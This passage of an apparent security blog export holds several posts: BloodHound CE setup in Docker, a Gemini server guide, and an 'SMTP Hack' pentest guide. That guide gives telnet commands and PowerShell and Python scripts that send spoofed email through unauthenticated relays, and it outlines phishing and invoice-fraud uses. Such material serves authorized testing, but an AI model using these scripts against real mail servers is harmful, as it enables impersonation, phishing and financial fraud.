presentation to avoid any last-minute issues.\nFeedback and Improvement: Seek feedback from peers or mentors to continually improve your presentation skills. Reflect on your performance and identify areas for growth.\nLive examples: If you have a live example that might not work for some reason (like presenting a complicated proof of concept), record your steps as a video and play it back to explain what you are doing. In a live session something can always go wrong, you get stressed and focus on fixing mistakes, wasting time instead of showing what you want. Even if you have done something 100 times before the presentation, everything that can go wrong will go wrong, this is Murphy’s Law.\nVideo over the stream: Do not embed video into the presentation, it is better to run it separately during the session rather than adding heavy content to the slides. If you have a live session that is online and not on stage, make sure that any multimedia files you are going to play will play smoothly.  In most cases I’ve seen, turning on the video in a live stream/webinar interrupts it and people on the other side can’t see or hear anything.\n\nWhen I practise my presentation, this is my first audience:\n\nthey are patient and appear to be interested but do not give feedback.\nThen I create an online meeting using Jitsi and invite friends and I do it again to get feedback. Finally, am ready to present to the target audience. Or at least I think so, because when it comes to presentations, I just get stressed, but I know I’ve rehearsed it so I do my thing. Maybe one day I will have a chance to say and present something interesting at one conference.\n"
    },
    {
        "title": "Bloodhound CE and Docker",
        "posted_at": "2024-04-22",
        "category": "guides",
        "author": "hoek",
        "content": "\nYo yo yo my dear readers. A chaotic article today about several things at once. Because why not.\nI wasn’t sure if I could handle this month’s article, if I’d write something meaningful or just a quick entry in the worth checking series. Whenever I have a busy month, I always leave an entry until the last minute and then something falls out, like this month’s health problems and surgery in the next few days. Fortunately I’m not dying yet. But if you don’t see the next entry next month, that means I’ve died. Well, it will happen one day anyway. But to the point.\n\nI generally use virtual machines for everything, or install binaries or compile from source as a last resort. I was also ignorant about containers. I mean, I have a container manager installed on my NAS (Synology) and sometimes I would test something there, download images or pre-built containers and install tools into them or use pre-built solutions. Most of the time I would only use a container as a last resort, when I knew there would be a lot of weird dependencies, packages, junk and complications compared to installing on my own home system. No one wants to mess up their main system for the sake of testing, only to have to reinstall a dying, overgrown system a year later. For some things, a virtual machine is too much, and a small container will do. In addition, many solutions, applications and services are increasingly being offered as ready-made containers - no unnecessary configuration, just download, run and it works out of the box (container).\nMany developers use containers, for app developing and testing, but there are also people who containerise everything they use every day to separate applications from the system. Crazy, but if it works and someone is using it, then why not.\nI recently had to revisit the Bloodhound tool. I discovered that a new version of the community edition has been created. Even on the official repository it says “This repository will be archived in the near future“. To get the latest version of Bloodhound, you can follow this link to the BloodHound Community Edition repository. My guess is that it’s all about money, that someone has taken over Bloodhound and that there will be an enterprise version and a community version. But I haven’t looked into it because it won’t change anything, and if I can use the community version, why bother. The latest release of the official version for today is 4.3.1 from 23 May 2023 and the community version is 5.8.1 from 12 April 2024. I immediately thought, ok, I’ll download the binaries and install them. It’s just that the binaries aren’t quite there yet. You can compile from source or use a container. That’s how I got interested in containers, again.\nI want Bloodhound on Kali because that’s where I had the previous version. Here are instructions on how to do it the old way. My virtual machine of the inept bounty hunter is based on Kali, so that’s where I decided to install Docker.\nIn Windows it’s trivial, you install Docker Desktop and that’s it, the console commands are the same plus there’s a graphical overlay. I’ll be honest, I don’t know how to use it and I felt lost there, so after a few tests I found I’d sit in the console because it was easier for me to learn a few commands than click in gui. The Docker Desktop itself on Windows is also a lot for one machine, and it’s worth having good hardware if you want to run lots of different containers at the same time.\nDocker on KaliIn Linux it is even easier. Two commands:\n12sudo apt install -y docker.iosudo apt install docker-compose\nYou can also use docker-ce from the official Docker repository, but nowadays docker.io in Debian-based distros and docker-ce are the same. In the past, the Debian version was outdated but this has changed.\nAnyway if you for some reason want to use docker-ce follow these steps.\nAdd repository:\n12echo \"deb [arch=amd64 signed-by=/etc/apt/keyrings/docker.gpg] https://download.docker.com/linux/debian bookworm stable\" | \\  sudo tee /etc/apt/sources.list.d/docker.list \nimport key\n12curl -fsSL https://download.docker.com/linux/debian/gpg |  sudo gpg --dearmor -o /etc/apt/keyrings/docker.gpg\nupdate and install:\n12sudo apt updatesudo apt install -y docker-ce docker-ce-cli containerd.io\nIf you really want to know what’s the difference between the two, check out this great answer on Stack Overflow. Yes, it’s still the best place for answers, not just GPT chat.\nDocker and Docker ComposerA brief explanation if you are a beginner like me.\nDocker and Docker Compose are both tools related to application containerization, but they differ in their scope and functionalities:\n\nDocker:\nDocker is a platform for building, deploying, and running applications in containers.\nIt allows for building, running, and managing containers.\nIt enables creating container images using Dockerfiles and building and sharing images via Docker Hub.\nIt allows for managing individual containers and their configurations.\n\n\nDocker Compose:\nDocker Compose is a tool for defining and running multi-container applications.\nIt allows for defining multiple containers as part of a single application and managing them as a whole.\nIt enables defining application configurations in a YAML file, including various containers, networks, volumes, dependencies, etc.\nIt ensures that all containers in the application are started and connected properly.\n\n\n\nIn summary, Docker is a general-purpose platform for containerizing applications, whereas Docker Compose is a tool more focused on managing multi-container applications and their configurations.\nDocker commands and BloodhoundNow let’s learn the Docker using Bloodhound as an example.\nFor my Docker apps I like to keep each configuration separate like:\n1234567Documents/└── Docker/    ├── BloodHound/    │   └── docker-compose.yml    ├── OtherApp/    │   └── docker-compose.yml    └── ...\nAs you know from the previous sections, we need a configuration file. Here is the file for Bloodhound. Download it to the folder.\nIt looks like:\n1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768697071727374757677787980818283848586878889# Copyright 2023 Specter Ops, Inc.## Licensed under the Apache License, Version 2.0# you may not use this file except in compliance with the License.# You may obtain a copy of the License at##     http://www.apache.org/licenses/LICENSE-2.0## Unless required by applicable law or agreed to in writing, software# distributed under the License is distributed on an \"AS IS\" BASIS,# WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.# See the License for the specific language governing permissions and# limitations under the License.## SPDX-License-Identifier: Apache-2.0version: '3'services:  app-db:    image: docker.io/library/postgres:13.2    environment:      - POSTGRES_USER=${POSTGRES_USER:-bloodhound}      - POSTGRES_PASSWORD=${POSTGRES_PASSWORD:-bloodhoundcommunityedition}      - POSTGRES_DB=${POSTGRES_DB:-bloodhound}    # Database ports are disabled by default. Please change your database password to something secure before uncommenting    # ports:    #   - 127.0.0.1:${POSTGRES_PORT:-5432}:5432    volumes:      - postgres-data:/var/lib/postgresql/data    healthcheck:      test:        [          \"CMD-SHELL\",          \"pg_isready -U ${POSTGRES_USER:-bloodhound} -d ${POSTGRES_DB:-bloodhound} -h 127.0.0.1 -p ${POSTGRES_PORT:-5432}\"        ]      interval: 10s      timeout: 5s      retries: 5      start_period: 30s  graph-db:    image: docker.io/library/neo4j:4.4    environment:      - NEO4J_AUTH=${NEO4J_USER:-neo4j}/${NEO4J_SECRET:-bloodhoundcommunityedition}      - NEO4J_dbms_allow__upgrade=${NEO4J_ALLOW_UPGRADE:-true}    # Database ports are disabled by default. Please change your database password to something secure before uncommenting    ports:      - 127.0.0.1:${NEO4J_DB_PORT:-7687}:7687      - 127.0.0.1:${NEO4J_WEB_PORT:-7474}:7474    volumes:      - ${NEO4J_DATA_MOUNT:-neo4j-data}:/data    healthcheck:      test:        [          \"CMD-SHELL\",          \"wget -O /dev/null -q http://localhost:${NEO4J_WEB_PORT:-7474} || exit 1\"        ]      interval: 10s      timeout: 5s      retries: 5      start_period: 30s  bloodhound:    image: docker.io/specterops/bloodhound:${BLOODHOUND_TAG:-latest}    environment:      - bhe_disable_cypher_qc=${bhe_disable_cypher_qc:-false}      - bhe_database_connection=user=${POSTGRES_USER:-bloodhound} password=${POSTGRES_PASSWORD:-bloodhoundcommunityedition} dbname=${POSTGRES_DB:-bloodhound} host=app-db      - bhe_neo4j_connection=neo4j://${NEO4J_USER:-neo4j}:${NEO4J_SECRET:-bloodhoundcommunityedition}@graph-db:7687/      ### Add additional environment variables you wish to use here.      ### For common configuration options that you might want to use environment variables for, see `.env.example`      ### example: bhe_database_connection=${bhe_database_connection}      ### The left side is the environment variable you're setting for bloodhound, the variable on the right in `${}`      ### is the variable available outside of Docker    ports:      ### Default to localhost to prevent accidental publishing of the service to your outer networks      ### These can be modified by your .env file or by setting the environment variables in your Docker host OS      - ${BLOODHOUND_HOST:-127.0.0.1}:${BLOODHOUND_PORT:-8080}:8080    ### Uncomment to use your own bloodhound.config.json to configure the application    # volumes:    #   - ./bloodhound.config.json:/bloodhound.config.json:ro    depends_on:      app-db:        condition: service_healthy      graph-db:        condition: service_healthyvolumes:  neo4j-data:  postgres-data:\nThis file is a Docker Compose configuration file that defines three container services:\n\napp-db:\nIt utilizes the PostgreSQL image version 13.2.\nIt sets environment variables for the PostgreSQL user, password, and database name.\nConfigures a volume for storing PostgreSQL data.\nDefines a health check to verify the availability of the PostgreSQL database.\n\n\ngraph-db:\nIt utilizes the Neo4j image version 4.4.\nSets environment variables for Neo4j authentication and allows database upgrade.\nConfigures access ports for Neo4j.\nCreates a volume for storing Neo4j data.\nDefines a health check to verify the availability of the Neo4j web interface.\n\n\nbloodhound:\nIt utilizes the Bloodhound image.\nSets environment variables for configuring Bloodhound, including connections to PostgreSQL and Neo4j.\nSpecifies the port on which the Bloodhound application should be accessible.\nDepends on the app-db and graph-db services and requires them to be running and healthy.\n\n\n\nNow in the folder with config file run command:\n1sudo docker-compose up\nThis will download the correct images, build containers and run them. Scroll up a little bit and locate the randomly generated password in the terminal output of Docker Compose. Look for something like:\n\nIn a browser, navigate to http://localhost:8080/ui/login. Login with a username of admin and the randomly generated password from the logs. You will be asked to change the password to your own. In the terminal you can press ctrl+c to close the containers. \nNow when you want to run Bloodhound, simply go to the folder with the configuration file and run Bloodhound with the command:\n1sudo docker-compose up -d\n-d - parameter will allow containers to run in the background, without the need to hold the terminal window.\nNow you are a happy user of the new Bloodhound Community Edition. You can start your AD reconnaissance. Oh actually, I haven’t told anyone what Bloodhound is. Hmm, I’m sure there will be an article about it in the near future.\nNow some important commands for using Docker:\n1sudo docker ps\nto display currently running containers.\nTo log in interactively to the console of a container, use the command:\n1sudo docker exec -it <container_name_or_ID> bash\nTo stop container use:\n1sudo docker stop <container_ID>\nyou can also specify several id’s separated by a space, or close all active by:\n1sudo docker stop $(sudo docker ps -q)\nIf you need to send or download a file to or from a container, use:\n1docker cp /path/to/file.txt container_name:/path/inside/container\n1docker cp container_name:/path/inside/container/plik.txt /local/path/\nYou can also mount the folder automatically when the container starts by adding a corresponding entry to the configuration. Edit you docker-compose.yml file and add inside proper container a volume path:\n12volumes:      - /path/on/contener:/local/path/to/folder\nThat’s all, Dockers and their use are not as scary as they may seem. Of course, the topic is very complex and the environment is complicated, but as a regular end user, you only need a few commands and basic knowledge. As I understand it, seriously, everyone will understand it.\nBloodhound Team WorkSometimes, if we are working in a team and we want access to Bloodhound to be not only local but also hosted on our server within our network for a few users, we can run a container with the IP address of the local machine, which is described in the official documentation, or, what is easier and probably even safer, we can use a reverse proxy.\nUsing Nginx (it is already installed in Kali), add another page:\n1sudo nano /etc/nginx/sites-available/bloodhound.conf\nwith configuration:\n123456789101112server {    listen 80;    server_name IP;  # Replace with your actual IP address    location / {        proxy_pass http://localhost:8080;        proxy_set_header Host $host;        proxy_set_header X-Real-IP $remote_addr;        proxy_set_header X-Forwarded-For $proxy_add_x_forwarded_for;        proxy_set_header X-Forwarded-Proto $scheme;    }}\nenable it:\n1sudo ln -s /etc/nginx/sites-available/bloodhound.conf /etc/nginx/sites-enabled/\nverify configuration:\n1sudo nginx -t\nstart Nginx:\n1sudo systemctl start nginx\nThanks to this, after entering the IP address of the computer, Nginx will redirect us to the locally running Bloodhound application. Don’t forget to make changes to the firewall and port forwarding in VirtualBox.\n"
    },
    {
        "title": "SMTP Hack",
        "posted_at": "2024-03-29",
        "category": "guides",
        "author": "hoek",
        "content": "\nWhen I enter the company (if I am hired to make a mess, not to break in), the first thing I do is look for the low hanging fruit. If there are a lot of them, I know the job will be easy and the company will have a lot to do in the next few months or even years if there is a mess in the environment. If there are no easy choices, I know it will be challenging and I will really have to work to show some results. Sometimes I won’t show anything, but that doesn’t mean I’m bad (or maybe I am), it just means the company is very well protected and ready for the attacker or insider threat (or ready for more skilled pentester). One of the tests I do is to check servers, forwarders or email relays.\nBut before I start, today’s header image for this article was created by a user of the 0ut3r Space Discord server, thanks for the interesting fan graphics. If you would like to hire this young artist for any kind of graphic work, feel free to visit Discord and contact user @011.\n\nOki doki, the unauthorized sending of email through a company’s email servers, relays and forwards is a very old vulnerability. Maybe it is no a vulnerability, but a misconfiguration, or a configuration that was made before Christ and that nobody has ever changed. In a nutshell, this SMTP configuration allows emails to be sent without authorization. E.g. by connecting via telnet to port 25, executing a few commands and sending a message on behalf of anyone in the company to anyone inside or outside the company, so that it looks like a real message.\nSpam groups often look for such gems to send out their spam in a very credible way. It can also be used in a hacking attack to send phishing emails to gain access to another part of the network or server and obtain the login and password of a more privileged user - a classic lateral movement. Also cool for financial fraud, by analyzing a company’s email communications, either within the company or from a leak in the past, it is easy to determine who is writing to whom, who is sending the invoices to whom, what the information on deposit account changes looks like, etc. It is then very easy to send a fake message that looks legitimate to a partner of the company just before an important transfer that there has been a change in the deposit account and replace account. You can, for example, rake in a million and disappear. All you have to do is get access to one company user’s computer, send an email and wait for the transfer. It is possible to send such an email to several companies and claim even more, or at least one of it, before anyone notices. I don’t need to explain this to you - you know what you can do with a fake email.\nAll right, but why such an error in the configuration? A few ideas spring to mind.\n\nLack of knowledge of the person who configured it, because they did it a very long time ago when the company was just being established. Nobody ever audited it afterwards.\n\nThe configuration was set up so that the administrator could check the connectivity and operation of the email server and it stayed that way.\n\nThe company has old equipment or equipment that is so simple (OT in production) that it cannot send status information or alerts in any other way than in plain text via the mail server without authorization. Instead of putting up a separate relay just for the OT that can only send certain things to certain places an existing email server was used.\n\n\nThere is probably more, but who cares?\nTelnet to port 25A simple test to see if it is possible to send unauthorised messages? Telnet to port 25 of your SMTP relay, forwarder or mail server.\nYou can use Putty if you are on Windows, or just the telnet command if you are on Linux.\n123PUTTY.EXE -telnet smtp.example.org 25ortelnet smtp.example.org 25\nIf the connection is successful, type commands:\n123456789helo localhostehlo localhostmail from: user1@example.orgrcpt to: user2@example.orgdataSubject: Test SubjectContent-Type: text/plain OR Content-Type: text/htmlMessage content or HTML code.\n\nhelo localhost: This command initiates the SMTP session and identifies the sender’s domain to the receiving server. In this case, it’s saying “hello” to the server and identifying itself as “localhost” (the local host or domain or whatever you would type here).\nehlo localhost: Similar to helo, ehlo (extended hello) is another command to initiate the SMTP session. It provides extended information about the client’s capabilities to the server. Again, it’s saying “hello” to the server, but in a more extended manner, and identifying itself as “localhost.” It will also show you possible commands to use on the server.\nmail from: user1@example.org: This command specifies the sender’s email address. In this case, it’s indicating that the email is from “user1@example.org“.\nrcpt to: user2@example.org: This command specifies the recipient’s email address. It tells the server that the email should be delivered to “user2@example.org“.\ndata: This command indicates the start of the email message data. It tells the server that the following lines will contain the email content.\nSubject: Test Subject: This line sets the subject of the email to “Test Subject”.\nContent-Type: text/plain OR Content-Type: text/html: This line specifies the content type of the email body. It can be either plain text (text/plain) or HTML (text/html), depending on which one is chosen.\nMessage content or HTML code: This is the actual content of the email message. It can be either plain text or HTML code, depending on the content type specified earlier.\n. (period): This signifies the end of the email message data. It tells the server that the email content has finished and should be processed and delivered accordingly.\n\nThese commands are fundamental to the SMTP protocol for sending email from a client to a server.\nI found that the connection was sometimes lost while typing the commands, so I wrote a script in PowerShell and Python to automate this.\nPowerShell mail senderIt will do the same as the commands from Telnet example, but all in one. Comments in the code.\n123456789101112131415161718192021222324252627282930313233# Setting up the sender email address$From = user1@example.org# Setting up the recipient email address$To = user1@example.org# Setting up the email subject$Subject = \"Test Subject\"# Setting up the email body content, can be html or text$Body = \"Test Body\"# Defining additional email headers including MIME version and content type$Headers = @{  \"MIME-Version\" = \"1.0\"  \"Content-Type\" = \"text/html; charset=UTF-8\"}# Constructing headers string for the email$HeadersString = \"\"foreach ($key in $Headers.Keys) {  $HeadersString += \"$($key): $($Headers[$key])`r`n\"}# Setting up the SMTP server address $SmtpServer = \"smtp.example.org\"# Setting up the SMTP server port$Port = 25# Sending the email using Send-MailMessage cmdlet with specified parametersSend-MailMessage -From $From -To $To -Subject $Subject -Body $Body -BodyAsHtml -SmtpServer $SmtpServer -Port $Port -Encoding ([System.Text.Encoding]::UTF8) #remove -BodyAsHtml to send it as plain text\nNow set up your own mails and server address and test it out! Make sure your boss has given you permission to do this ;)\nPython mail senderExample 1, with html code as body, less comments as you already know what is happening, based on the previous examples.\n123456789101112131415161718192021222324252627282930import smtplibfrom email.mime.multipart import MIMEMultipartfrom email.mime.text import MIMEText# Mail settingssmtp_server = 'smtp.example.org'smtp_port = 25sender_email = 'user1@example.org'receiver_email = 'user2@example.org'subject = 'Test Subject'# HTML message contenthtml_content = \"\"\"<html>HTML CODE HERE</html>\"\"\"# Creating the messagemsg = MIMEMultipart()msg['From'] = sender_emailmsg['To'] = receiver_emailmsg['Subject'] = subject# Adding HTML content to the messagemsg.attach(MIMEText(html_content, 'html'))# Sending the messagewith smtplib.SMTP(smtp_server, smtp_port) as server:  server.sendmail(sender_email, receiver_email, msg.as_string())\n Example 2, different approach and body as text:\n123456789101112131415161718192021222324252627282930313233343536373839404142434445464748import smtplibfrom email.mime.multipart import MIMEMultipartfrom email.mime.text import MIMETextfrom email.header import Header# Setting the sender's email addressfrom_email = user1@example.org# Setting the recipient's email addressto_email = user2@example.org# Setting the email subjectsubject = \"Test Subject\"# Setting the email body contentbody = \"Test Body\"# Creating an instance of MIME Multipartmsg = MIMEMultipart()# Setting the headersmsg[\"From\"] = from_emailmsg[\"To\"] = to_emailmsg[\"Subject\"] = Header(subject, \"utf-8\")# Setting custom headersmsg.add_header(\"MIME-Version\", \"1.0\")msg.add_header(\"Content-Type\", \"application/ms-tnef; name=\\\"winmail.dat\\\"\")msg.add_header(\"Content-Transfer-Encoding\", \"binary\")# Creating the email body content as MIMETextbody_content = MIMEText(body, \"plain\")# Attaching the email body content to the messagemsg.attach(body_content)# Setting the SMTP serversmtp_server = \"smtp.example.org\"smtp_port = 25# Creating an SMTP connectionserver = smtplib.SMTP(smtp_server, smtp_port)# Sending the email messageserver.send_message(msg)# Closing the SMTP connectionserver.quit() \nPlease don’t laugh at my code, I’m just learning Python.\nSo these are the simplest steps to see if we can mess with SMTP in the company.\nSome companies add some sort of configuration on the server to add a banner saying that the message is from outside, even though you sent it internally using examples above, or a banner saying that you rarely receive email from a certain person in the company, e.g. the CEO. If you send the message as text rather than HTML, the formatting of these banners will also be ignored and they will be plain text, i.e. they will not glow red or yellow. Also, I know from experience that people see the same banners over and over again and ignore them after a while. When you send a message outside your company, nothing of the sort will happen. The message will be normal, without warnings, and after checking the source, the official company name will appear.\nEnjoy the pentesting.\n"
    },
    {
        "title": "Gemini server for 0ut3r.space",
        "posted_at": "2024-02-27",
        "category": "entertainment",
        "author": "hoek",
        "content": "\nAnother strange thing I decided to do with 0ut3r.space was to serve it via Gemini, I mean not the full copy, but a frontage only (full copy maybe if there will be someone who wants to read it in the Gemini world). As always, I wanted to learn something new while discovering something new. Also, only real hackers serve content over Gemini (lol), and I wanted to get new visitors by allowing users from another network to access my site’s resources, thus increasing its audience and reach. If you have any ideas where else I could post blog content, let me know in the comments below the post (lol*2). Yes I know there are no comments there xD, but I’m sure you’ll find the 0ut3r.space community somewhere, you’re smart because those are the only people who read this blog, oh gosh what a bullshit…\n\nSo what the heck is Gemini? The best would be read Wikipedia entry and official website, if you are looking for shorter description I here is the best quote:\n\nGemini in 100 words\nGemini is a new internet technology supporting an electronic library of interconnected text documents. That’s not a new idea, but it’s not old fashioned either. It’s timeless, and deserves tools which treat it as a first class concept, not a vestigial corner case. Gemini isn’t about innovation or disruption, it’s about providing some respite for those who feel the internet has been disrupted enough already. We’re not out to change the world or destroy other technologies. We are out to build a lightweight online space where documents are just documents, in the interests of every reader’s privacy, attention and bandwidth.\n\nNice, right? It’s like Gopher, but fresh and much more security-oriented. I knew about Gopher and had read about it in the past, but I didn’t know about Gemini, I didn’t even know it existed.\nGemini is not going to make us all suddenly abandon the regular internet. But it is an interesting alternative for boomers like me who like to read and not be distracted by a million images, ads, pop-ups and suggestions. Even with ad blockers and all that crap, the internet doesn’t look like it used to. So you can use Gemini and feel like it used to be. Will you find different content? I don’t think so. You will definitely find something interesting, more individual and made with passion. From geeks for geeks.\nBut as with everything Gemini is a curiosity, at least for now. Maybe that will change in the future, but for now it can be something you get excited about very quickly, only to abandon completely after a while. A great example of this is article by makeworld user. I recommend reading it.\nGemini browserTo understand this better, download the browser and look at a few pages and everything will become clear. Let me give you some of the browser projects that are actively under development.\n\nLagrange - A Beautiful Gemini Client\n\nKristall - A high-quality visual cross-platform gemini browser\n\nAmfora - A fancy terminal browser for the Gemini protocol\n\nRosy Crow -  Gemini protocol client for Android\n\n\nFirst two also supports gopher and finger protocols. Choose one and visit some Gemini pages.\nYou can also browse Gemini network using web proxy.\n\nhttps://portal.mozz.us/\n\nhttps://www.warmedal.se/~wobbly/\n\nhttps://gemini.tildeverse.org/\n\n\nGemini linksAnd here is a list of some Gemini websites good as a starting point:\n\ngemini://warmedal.se/~antenna/ - Geminispace aggregator\ngemini://geminispace.info - public search provider for Gemini\ngemini://gemplex.space - experimental Search Engine for Gemini written in Go\ngemini://kennedy.gemi.dev - public search provider for Gemini\ngemini://houston.gmi.bacardi55.io - A simple tool to check if a capsule is up or not\ngemini://tlgs.one - Another public search provider for Gemini.\n\nAdditional Gopher info and links\n\ngopher://gopher.floodgap.com/\ngopher://gopher.floodgap.com/1/world\n\nOther resources:\n\nhttps://github.com/kr1sp1n/awesome-gemini\n\nGemini serverIf you want to set up your server and share content in the Gemini network, it is quite easy and requires few resources. Uses fewer resources than a normal web server. And the content is a gmi file whose content is gemtext very similar to the markdown. At the end of the day, the Gemini Network is all about pure text with no quirks, along with illustrations to accompany the text.\nFor my setup I choose the Agate server, simple and lightweight. It also has it’s own website served in Gemini. For my setup I mixed up things from these tutorials:\n\nCreating and serving gemini capsules\nHow to install and set-up a gemini server\nHow to make a gemini capsule - the protocol, not the rocket. So you too can be cool!\n\nIf you want to build more complex Gemini websites you may be interested in other server solutions to the Agate:\n\nJetForce\nSpacebeans (this one is served on Gemini, use proper browser)\n\nAnd here are my instructions, I set it up on my VPS running Debian where my 0ut3r.space website is hosted.\nPreparationPrepare user. It is a good idea to run this service as a separate user. In general, it is good practice to run different services as separate users. This is the same approach as with Nginx, which always runs as www-data or nginx user.\n1sudo adduser --system --no-create-home gemini\nThe --system flag creates a system user without a home directory, and --no-create-home ensures that no home directory is created for the user. Command creates a system user, which by default has /bin/false as its login shell. This effectively blocks interactive logon for the user.\nPrepare folders:\n1mkdir -p /opt/gemini/{content,cert,bin}\nbin for the server, cert for the certificate and content for the Gemini page content.\nAdd gemini user permissions to these folders:\n12sudo chown -R gemini:gemini /opt/gemini/sudo chmod -R u+rwx /opt/gemini/\nServerDownload latest Agate release:\n1wget https://github.com/mbrubeck/agate/releases/download/v3.3.4/agate.x86_64-unknown-linux-gnu.gz\nUnzip content:\n1gunzip agate.x86_64-unknown-linux-gnu.gz\nRename it and allow execute:\n12mv agate.x86_64-unknown-linux-gnu agatechmod +x agate\nAgate should be placed in/opt/gemini/bin.\nContentNow create content for you capsule, here is my example:\n1nano /opt/gemini/content/index.gmi\nwith gemtext code inside:\n12345678910111213141516171819202122232425# 0ut3r.space```  ___        _   _____ / _ \\ _   _| |_|___ / _ __ ___ _ __   __ _  ___ ___| | | | | | | __| |_ \\| '__/ __| '_ \\ / _` |/ __/ _ \\| |_| | |_| | |_ ___) | |_ \\__ \\ |_) | (_| | (_|  __/ \\___/ \\__,_|\\__|____/|_(_)|___/ .__/ \\__,_|\\___\\___|                               |_|```Welcome to 0ut3r Space Gemini Capsule!This is just a signpost in the Gemini world to the real website. Maybe if some readers are interested I will move my posts here too. Just let me know.## Full blog articles=> https://0ut3r.space HTTPS main 0ut3r.space website=> http://reycdxyc24gf7jrnwutzdn3smmweizedy7uojsa7ols6sflwu25ijoyd.onion Onion mirror in Tor## Articles importd to Gemini Capsule=> art/cve-2023-32784.gmi CVE-2023-32784 - Hacking Keepass=> art/windows-defender.gmi Windows Defender is enough, if you harden it## Socials=> https://mastodon.social/@h03k Mastodon\nMy articles are located in /opt/gemini/content/art/ and images for the articles are in /opt/gemini/content/img.\nSince I use the Hexo content generator my article source files with articles are in markdown format so I simply convert them using md2gemini Python tool to converts markdown to gemtext compatible with Gemini.\n1.\\md2gemini.exe -w -d c:\\output\\ C:\\source\\article.md\nUnfortunately the output was not the best and I had to tweak it manually. Maybe I will write a script to convert a hexo markdown file to gemtext.\nCertificateThe Agate server will automatically create a cert during the first run in the folder you specify in the parameter:\n1/opt/gemini/bin/agate --content /opt/gemini/content/ --certs /opt/gemini/cert/ --hostname capsule.example.com --lang en-US --addr 0.0.0.0:1965\nHowever, if you are using a different server, here is some information on how to create your own self-signed certificate. If you are using Agate, you can skip this step.\nGemini protocol prefers self-signed certificates over those issued by trusted Certificate Authorities (CAs) for several reasons:\n\nMinimization of Complexity: Gemini emphasizes simplicity and minimalism in its design. Using self-signed certificates eliminates the need to trust external CAs and manage them, which aligns with this philosophy.\nNo Third-Party Dependency: With self-signed certificates, there’s no need to rely on external institutions (such as trusted CAs), which may be more in line with the decentralization and independence ideals important to the Gemini protocol.\nControl Over Keys: Users have full control over the key and certificate generation process, which can enhance the sense of security and privacy.\nInformality: Gemini doesn’t require formal certificates, which are standard for protocols like HTTPS. In Gemini’s case, self-signed certificates are sufficient to provide encryption and data integrity.\nSecurity: Self-signed certificates can be as secure as those issued by CAs, as long as keys are properly managed and stored.\n\nIn summary, Gemini prefers self-signed certificates due to their simplicity, lack of reliance on external institutions, user control over keys, informality of the protocol, and the ability to provide security and privacy without the need for a third party.\nFor Gemini protocol, when choosing a certificate for self-signed Gemini sites, it’s generally better to opt for the ECDSA (Elliptic Curve Digital Signature Algorithm) algorithm over RSA (Rivest-Shamir-Adleman). Here’s why:\n\nPerformance: ECDSA algorithm is typically more efficient than RSA, meaning encryption and decryption operations can be processed faster, which is significant in the context of a Gemini server handling potentially large volumes of requests.\nKey Size: ECDSA keys are much shorter than RSA keys for equivalent security levels. This means ECDSA certificates generate less network and memory overhead.\nSecurity: Currently, ECDSA is considered to offer a similar level of security to RSA but with shorter key lengths.\nSupport for Older Clients: It’s worth noting that older Gemini clients may not support ECDSA, in which case RSA would be necessary. However, most modern clients do support ECDSA.\n\nThe ECDSA algorithm is typically a better choice for self-signed Gemini site certificates due to its performance, smaller key size, and overall good security. However, it’s important to ensure that the client being used supports ECDSA to avoid compatibility issues. It is more up to you which one you will choose.\nHere is the command to create a certificate:\n1sudo openssl req -new -subj \"/CN=capsule.example.com\" -x509 -newkey ec -pkeyopt ec_paramgen_curve:prime256v1 -days 3650 -nodes -out /opt/gemini/cert/cert.pem -keyout /opt/gemini/cert/key.pem\nIf you decide to go with RSA algorithm use this one:\n1sudo openssl req -new -subj \"/CN=capsule.example.com\" -x509 -newkey rsa:2048 -days 3650 -nodes -out /opt/gemini/cert/cert.pem -keyout /opt/gemini/cert/key.pem\nDon’t forget to change you CN= to match your domain.\nNginx configurationI also added Nginx configuration to redirect my subdomain to Gemini protocol, it’s just additional server block and Let’s Encrypt cert for subdomain:\n12345678910111213141516171819202122server {    listen 80;    server_name capsule.example.com;    return 301 https://$host$request_uri;}server {    listen 443 ssl;    server_name capsule.example.com;    # Redirect for Gemini protocol in standard web browser    location / {        return 301 gemini://capsule.example.com$request_uri;    }    # SSL Configuration for capsule subdomain    ssl_certificate /etc/letsencrypt/live/capsule.example.com/fullchain.pem; # managed by Certbot    ssl_certificate_key /etc/letsencrypt/live/capsule.0ut3r.space/privkey.pem; # managed by Certbot    include /etc/letsencrypt/options-ssl-nginx.conf; # managed by Certbot    ssl_dhparam /etc/letsencrypt/ssl-dhparams.pem; # managed by Certbot}\nI created this server for the subdomain capsule.0ut3r.space so in the DNS section for the subdomain this address points to my server IP, if you create a fresh server with a new domain do not forget to set up DNS in your domain provider dashboard. I had to choose subdomain for my capsule and not main as I use Cloudflare and it doesn’t support gopher/gemini protocols.\nIf you only have a Gemini server, or are using the same main address for both Gemini and web server, you can skip this step. I just wanted to show you how I handled it on my server.\nFirewallGemini capsules are served on port 1965 so do not forget to enable it on firewall:\n1sudo ufw allow 1965\nServiceAlmost everything is ready. Lets setup Agate as service.\n1sudo nano /etc/systemd/system/agate.service\nHere is the content:\n1234567891011[Unit]Description=AgateAfter=network.target[Service]User=geminiType=simpleExecStart=/opt/gemini/bin/agate --content /opt/gemini/content --certs /opt/gemini/cert/ --hostname capsule.example.com --lang en-US --addr 0.0.0.0:1965[Install]WantedBy=default.target\nOnce again, make sure that the permissions for each newly created file are OK.\n12sudo chown -R gemini:gemini /opt/gemini/sudo chmod -R u+rwx /opt/gemini/\nEnable and start Agate server.\n123sudo systemctl enable agatesudo systemctl daemon-reloadsudo systemctl start agate\nThat’s it! Now go and visit your server in Gemini browser e.g. Lagrange. My URL is gemini://capsule.0ut3r.space.\nNow I feel like a real hacker…\nIssues I found:\n\nI tried to use it with Cloudflare, but unfortunately it does not work with the free subscription and gemini/gopher protocols are not supported. It is probably possible with paid option and Cloudflare Spectrum, but I am not able to test it. If someone ever setup Cloudflare for Gemini server I am happy to get feedback.\n\n"
    },
    {
        "title": "TLS Certificate for Onion domain",
        "posted_at": "2024-02-09",
        "category": "guides",
        "author": "hoek",
